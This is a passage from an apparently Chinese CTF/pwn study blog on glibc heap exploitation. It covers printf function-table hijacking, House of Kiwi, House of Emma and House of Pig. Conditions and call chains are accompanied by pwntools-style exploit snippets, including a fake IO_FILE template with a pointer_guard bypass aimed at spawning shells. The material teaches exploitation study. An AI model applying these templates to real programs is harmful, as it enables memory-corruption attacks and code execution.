</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=o>||</span> <span class=n>__printf_arginfo_table</span><span class=p>[</span><span class=n>spec</span><span class=o>-&gt;</span><span class=n>info</span><span class=p>.</span><span class=n>spec</span><span class=p>]</span> <span class=o>==</span> <span class=nb>NULL</span> <span class=c1>// 覆盖后不满足
</span></span></span><span class=line><span class=cl><span class=c1></span>    		<span class=c1>// 调用info.spec中函数，后一行为参数
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=o>||</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span> <span class=p>(</span><span class=n>spec</span><span class=o>-&gt;</span><span class=n>ndata_args</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=n>__printf_arginfo_table</span><span class=p>[</span><span class=n>spec</span><span class=o>-&gt;</span><span class=n>info</span><span class=p>.</span><span class=n>spec</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=p>(</span><span class=o>&amp;</span><span class=n>spec</span><span class=o>-&gt;</span><span class=n>info</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>spec</span><span class=o>-&gt;</span><span class=n>data_arg_type</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>spec</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>     <span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span></span></span></code></pre></div></div></li></ol><p>在两个函数中都会调用函数，劫持<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>指针写入 one_gadget 获取 shell</p><p><strong>利用</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20250121225208401.png alt=图片无法加载><ul><li><p>unsorted bin 泄露 liibc 基址</p></li><li><p>修改 <code>global_max_fast</code>为极大值</p></li><li><p>可利用<code>House of Corrosion</code>将<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>值覆盖成释放堆块的内存指针，构造：</p><ul><li><p><code>__printf_function_table</code>覆盖为非 0 值，通过<code>vfprintf</code>中判断使调用<code>printf_positional</code></p></li><li><p><code>__printf_function_table</code>或<code>__printf_arginfo_table</code>相应偏移处指向写有 one_gadget 的内存指针</p></li><li><p>若利用<code>__printf_function_table</code>触发需要<code>__printf_arginfo_table</code>指向内存且该内存对应 spec 偏移处为 NULL</p></li></ul></li><li><p>调用<code>printf</code>触发漏洞</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add_chunk</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__printf_arginfo_table&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main_arena&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>))</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add_chunk</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__printf_function_table&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main_arena&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>))</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 经过ASCII码值偏移个8字节的NULL，one_gadget</span>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;d&#39;</span><span class=p>)</span> <span class=o>*</span> <span class=mi>8</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>*</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>one_gadget</span><span class=p>))</span> <span class=c1># 可修改4也可修改5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 释放到 fast bin 中，即利用 House of Corrosion修改两个指针为对应chunk地址</span>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 最终触发printf(&#34;%d&#34;,xx)即可</span></span></span></code></pre></div></div><h4 id=house-of-kiwi>House of Kiwi</h4><p><strong>背景</strong></p><p>调用<code>exit</code>退出可通过劫持<code>vtable</code>上<code>_IO_overflow</code>劫持：FSOP</p><p>调用<code>_exit</code>退出直接系统调用不经过 IO 清理工作，需主动触发异常退出来调用<code>vtable</code>上相关函数</p><p>调用<code>read</code>或<code>write</code>不会走 IO 而直接走系统调用</p><p><strong>条件</strong></p><ul><li><p>&lt;glibc-2.35，某些 glibc 版本<code>_IO_file_jumps</code>地址所在段可写</p></li><li><p>利用<code>sysmalloc</code>中的<code>assert</code></p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>assert</span> <span class=p>((</span><span class=n>old_top</span> <span class=o>==</span> <span class=nf>initial_top</span> <span class=p>(</span><span class=n>av</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>old_size</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>      <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(</span><span class=n>old_size</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=n>MINSIZE</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>       <span class=nf>prev_inuse</span> <span class=p>(</span><span class=n>old_top</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>       <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=n>old_end</span> <span class=o>&amp;</span> <span class=p>(</span><span class=n>pagesize</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>));</span></span></span></code></pre></div></div></li><li><p>assert 不满足将调用<code>__malloc_assert</code>，利用其中的<code>fflush (stderr)</code></p></li><li><p>最终通过<code>_IO_fflush</code>中的<code>_IO_SYNC</code>，调用 vtable 中的<code>__sync</code>函数指针</p></li></ul><p><code>_IO_SYNC</code>对应汇编部分内容</p><p>将<code>_IO_file_jumps_</code>对应<code>_IO_new_file_sync</code>函数指针位置覆盖为 one_gadget</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-assembly data-lang=assembly>mov rbp, qword ptr [rbx + 0xd8] ; rbp指向 __GI__IO_file_jumps_
...
call qword ptr [rbp + 0x60] ; 调用_IO_new_file_sync</code></pre></div><p><strong>利用</strong></p><ul><li>泄露堆地址，利用 tcache 相关攻击，任意地址 malloc 到<code>tcache_perthread_struct</code>，修改 count 为 0x7</li><li>unsorted bin leak 泄露 libc 基址，任意地址写修改<code>_IO_file_jumps</code>为<code>one_gadget</code></li><li>或修改<code>_IO_file_jumps</code>某偏移处为<code>system</code>，修改<code>_IO_2_1_stderr_</code>（实则为参数 rdi 值）为<code>/bin/sh</code></li><li>最终破坏 top chunk 结构（size 改为 0），然后申请新堆块触发 assert 即可</li></ul><p><strong>ORW 利用</strong></p><p>若无法 execve 系统调用，需借助 setcontext，根据 rdx 指向内存区域设置，调用<code>_IO_new_file_sync</code>时 rdx 指向<code>_IO_helper_jumps</code>结构(可写)，在该结构处伪造 setcontext+offset 实现 ORW</p><p>call 的地址改为<code>&(setcontext+offset)</code>，修改<code>__start___libc_IO_vtables</code>为<code>SigreturnFrame</code>，实际改的是<code>_IO_helper_jumps</code>，其中有些地址不可随意覆盖，以调试报错为准，设置 rsp 指向提前布置号的 rop 的起始位置，同时设置 rip 指向 <code>ret</code> 指令</p><p><strong>glibc-2.36 开始</strong><code>__malloc_assert</code>不再调 IO 而是直接系统调用<code>sys_writev</code>，方法失效</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>_Noreturn</span> <span class=k>static</span> <span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>__malloc_assert</span> <span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>assertion</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>file</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                 <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>line</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>function</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=nf>__libc_message</span> <span class=p>(</span><span class=n>do_abort</span><span class=p>,</span> <span class=s>&#34;\
</span></span></span><span class=line><span class=cl><span class=s>Fatal glibc error: malloc assertion failure in %s: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=n>function</span><span class=p>,</span> <span class=n>assertion</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__builtin_unreachable</span> <span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><h4 id=house-of-emma>House of Emma</h4><ul><li>&lt;glibc-2.35</li><li>利用<code>_IO_jump_t</code>类型的函数表<code>_IO_cookie_jumps</code>，包括<code>read,write,seek,close</code>函数，需要绕过指针保护 <code>PTR_DEMANGLE</code></li><li>汇编可知：宏定义操作将函数指针循环右移 11 位，并与<code>fs:[0x30]</code>异或得到真正函数地址</li><li><code>fs:[0x28]</code>为 tls 上存储的 canary，根据<code>tcbhead_t</code>结构体定义<code>fs:[0x30]</code>为<code>pointer_guard</code>用于加密</li></ul><p>可通过 gdb 中命令<code>canary</code>以及<code>search -8 canary_value</code>找到 tls 地址</p><p><strong>利用</strong></p><ul><li>泄露堆地址、libc 基址，large bin attack 在 tls 对应<code>pointer_guard</code>上写一个堆地址来绕过指针保护</li><li>覆盖<code>stderr</code>为堆地址，同 House of Kiwi，伪造<code>_IO_cookie_file</code>，修改 vtable 函数指向的指针</li><li>改坏 top chunk 通过<code>__malloc_assert</code>触发漏洞，且可结合 setcontext 利用 rop</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20250122182857674.png alt=图片无法加载><p><strong>调用链</strong>：</p><p><code>__malloc_assert</code> -> <code>__fxprintf</code> -> <code>__vfxprintf</code> -> <code>locked_vfxprintf</code> -> <code>__vfprintf_internal</code></p><p><code>__vfprintf_internal</code>实际调用<code>vprintf</code>，其中<code>outstring</code>函数最终调用了<code>PUT</code>，为 IO 调用，调用 vtable 指针</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>outstring</span> <span class=p>((</span><span class=k>const</span> <span class=n>UCHAR_T</span> <span class=o>*</span><span class=p>)</span> <span class=n>format</span><span class=p>,</span> <span class=n>lead_str_end</span> <span class=o>-</span> <span class=p>(</span><span class=k>const</span> <span class=n>UCHAR_T</span> <span class=o>*</span><span class=p>)</span> <span class=n>format</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define outstring(String, Len)                          \
</span></span></span><span class=line><span class=cl><span class=cp>    do {                                                \
</span></span></span><span class=line><span class=cl><span class=cp>        const void *string_ = (String);                 \
</span></span></span><span class=line><span class=cl><span class=cp>        done = outstring_func(s, string_, (Len), done); \
</span></span></span><span class=line><span class=cl><span class=cp>        if (done &lt; 0)                                   \
</span></span></span><span class=line><span class=cl><span class=cp>            goto all_done;                              \
</span></span></span><span class=line><span class=cl><span class=cp>    } while (0)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp># define PUT(F, S, N)   _IO_sputn ((F), (S), (N))
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>int</span>
</span></span><span class=line><span class=cl><span class=nf>outstring_func</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=n>s</span><span class=p>,</span> <span class=k>const</span> <span class=n>UCHAR_T</span> <span class=o>*</span><span class=n>string</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>length</span><span class=p>,</span> <span class=kt>int</span> <span class=n>done</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span> <span class=p>((</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>done</span> <span class=o>&lt;=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span> <span class=n>INT_MAX</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>((</span><span class=kt>size_t</span><span class=p>)</span> <span class=nf>PUT</span> <span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>string</span><span class=p>,</span> <span class=n>length</span><span class=p>)</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span> <span class=p>(</span><span class=n>length</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>done_add_func</span> <span class=p>(</span><span class=n>length</span><span class=p>,</span> <span class=n>done</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>此时调用 PUT 实际调用了<code>_IO_cookie_write</code>，调用后 write 指向加密后的 setcontext 中转 gadget，参数<code>_cookie</code>为伪造的<code>SigreturnFrame</code>地址处</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-assembly data-lang=assembly>call qword ptr [rbx + 0x38] ; _IO_cookie_write</code></pre></div><p>接着解密 write 指针值，获取到中转 gadget 地址，进入后最终<code>call &lt;setcontext+offset</code>，设置寄存器后栈迁移到堆上进行 ORW_ROP</p><p><strong>模板</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_buf_base;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>  <span class=c1># from _IO_save_base to _markers</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># the FILE chain ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>  <span class=c1># _fileno for stderr is 2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _flags2, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _old_offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _cur_column</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>  <span class=c1># _vtable_offset</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>  <span class=c1># _shortbuf[1]</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># padding</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x1ea0</span><span class=p>)</span>  <span class=c1># _IO_stdfile_1_lock</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _codecvt, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x160</span><span class=p>)</span>  <span class=c1># _IO_wide_data_1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span>  <span class=c1># from _freeres_list to __pad5</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xFFFFFFFF</span><span class=p>)</span>  <span class=c1># _mode, usually -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>19</span>  <span class=c1># _unused2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=n>fake_file</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xD8</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># adjust to vtable</span>
</span></span><span class=line><span class=cl><span class=c1># fake vtable call [reg + xx] 如图调整偏移</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_cookie_jumps&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 继承增加内容</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>frame_addr</span><span class=p>)</span> <span class=c1># __cookie</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># read</span>
</span></span><span class=line><span class=cl><span class=c1># 利用setcontext中转相关的gadget的地址与file_addr异或，类似于与pointer_guard异或，然后循环左移</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rol</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>()</span> <span class=o>^</span> <span class=n>file_addr</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>))</span>  <span class=c1># write</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># seek</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># close</span></span></span></code></pre></div></div><h4 id=house-of-pig>House of Pig</h4><p>适用于 calloc 分配内存情况，当 tcache 中有 chunk，仍会从 fastbin 或 small bin 等中拿 chunk</p><h5 id=glibc234>glibc&lt;2.34</h5><ul><li>利用 tcache stash unlink 与 largebin attack 劫持<code>_IO_list_all</code>然后伪造 IO_FILE 结构体</li><li>劫持<code>vtable</code>到<code>_IO_str_jumps</code>上，程序退出利用<code>_IO_str_overflow</code>的<code>malloc</code>完成攻击</li><li>以及<code>memcpy</code>在<code>__free_hook</code>处写入 system 地址，利用 free 获取 shell</li></ul><p>为让 <code>_IO_flush_all_lockp</code> 能调用执行到 <code>_IO_OVERFLOW</code> 从而调用 <code>_IO_str_overflow</code> ，需要满足：</p><ul><li><code>fp->_mode &lt;= 0</code>以及<code>fp->_IO_write_ptr > fp->_IO_write_base</code></li></ul><p><strong>利用</strong></p><p>① 泄露堆地址、libc 地址</p><p>② 将一个 chunk 释放进入 large bin ，利用 large bin attack 将<code>_IO_list_all</code>指向该 chunk 以及将<code>__free_hook-0x8</code>指向该 chunk</p><p>③ 向 tcache bin 放入 5 个 chunk，通过计算(2*(_IO_buf_end - _IO_buf_base) + 100 = 0x94)来作为大小</p><p>④ 向 small bin 中放入 2 个 chunk，修改 bk 指向<code>__free_hook - 0x20</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># chunk1, 3 进入 unsorted bin 中</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 其中一个 chunk 切割后进入unsorted bin中，另一个chunk 进入large bin中</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x420</span> <span class=o>-</span> <span class=mh>0xa0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># large bin中chunk切割后进入unsroted bin中，unsorted bin中chunk进入small bin</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x420</span> <span class=o>-</span> <span class=mh>0xa0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># unsorted bin 中 chunk 进入 small bin中</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0xa0</span><span class=p>)</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20250122210010100.png alt=图片无法加载><p>⑤ 申请一个 chunk 触发 tcache stash unlink，使得 tcache 直接指向<code>__free_hook-0x10</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
